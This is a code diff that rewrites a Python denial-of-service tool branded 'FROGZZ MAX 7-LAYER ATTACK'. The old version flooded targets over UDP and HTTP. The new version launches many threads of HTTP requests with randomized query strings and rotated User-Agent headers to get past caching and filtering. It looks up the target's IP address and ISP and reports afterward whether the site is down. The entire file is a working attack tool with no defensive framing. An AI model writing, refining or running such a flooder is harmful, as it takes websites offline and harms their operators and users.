@@ -1,21 +1,82 @@
-import threading, time, socket, requests
+import requests
+import threading
+import time
+import random
+import string
+import socket
+import os
 
-def udp_attack(ip, port, duration, thread_id): timeout = time.time() + duration sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) data = b'FROGZZ-ATTACK' * 50 while time.time() < timeout: try: sock.sendto(data, (ip, port)) print(f"[UDP-{thread_id}] Attack sent to {ip}:{port}") except: continue
+RED = "\033[91m"
+RESET = "\033[0m"
 
-def http_attack(url, duration, thread_id): timeout = time.time() + duration while time.time() < timeout: try: r = requests.get(url) print(f"[HTTP-{thread_id}] Status {r.status_code} to {url}") except: continue
+def random_query(length=5):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-def start_attack(): print("\n[!] Masukkan informasi serangan:") target = input("Target IP / Domain (cth: 1.1.1.1 / http://example.com): ") method = "UDP+HTTP" threads = int(input("Jumlah Threads (cth: 50): ")) duration = int(input("Durasi Serangan dalam detik (cth: 10): "))
+def generate_headers():
+    return {
+        "User-Agent": random.choice([
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "Mozilla/5.0 (Linux; Android 10)",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
+            "curl/7.68.0",
+        ]),
+        "Referer": "https://google.com",
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        "Accept-Encoding": "gzip, deflate",
+    }
 
-print(f"\n[INFO] Menyerang {target} menggunakan metode {method} dengan {threads} threads selama {duration} detik...\n")
+def http_attack(url, duration, thread_id):
+    end = time.time() + duration
+    while time.time() < end:
+        try:
+            full_url = url + "?" + random_query()
+            r = requests.get(full_url, headers=generate_headers(), timeout=3)
+            print(f"[{thread_id}] Sent => {full_url} [{r.status_code}]")
+        except:
+            print(f"[{thread_id}] Timeout or failed request")
+            continue
 
-for i in range(threads):
-    if target.startswith("http"):
-        t = threading.Thread(target=http_attack, args=(target, duration, i))
-    else:
-        t = threading.Thread(target=udp_attack, args=(target, 80, duration, i))
-    t.daemon = True
-    t.start()
+def get_target_info(url):
+    host = url.split("//")[1].split("/")[0]
+    ip = socket.gethostbyname(host)
+    try:
+        isp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json().get("isp", "Unknown")
+    except:
+        isp = "Unknown"
+    return ip, isp
 
-time.sleep(duration)
-print("\n[✓] Serangan selesai!")
+def check_status(url):
+    try:
+        r = requests.get(url, timeout=5)
+        return "ON" if r.status_code == 200 else "DOWN"
+    except:
+        return "DOWN"
 
+def main():
+    os.system('clear')
+    print(f"{RED}==== FROGZZ MAX 7-LAYER ATTACK ===={RESET}")
+    url = input("Target URL (with http/https): ")
+    duration = int(input("Duration (seconds): "))
+    threads = int(input("Threads (recommend 50-100): "))
+
+    ip, isp = get_target_info(url)
+    print(f"{RED}Target IP : {ip} | ISP : {isp}{RESET}")
+
+    thread_list = []
+    for i in range(threads):
+        t = threading.Thread(target=http_attack, args=(url, duration, i+1))
+        t.start()
+        thread_list.append(t)
+
+    for t in thread_list:
+        t.join()
+
+    status = check_status(url)
+    print(f"\n{RED}Attack Finished")
+    print(f"[IP : {ip}]")
+    print(f"[ISP : {isp}]")
+    print(f"[STATUS : {status}]{RESET}")
+
+if __name__ == "__main__":
+    main()
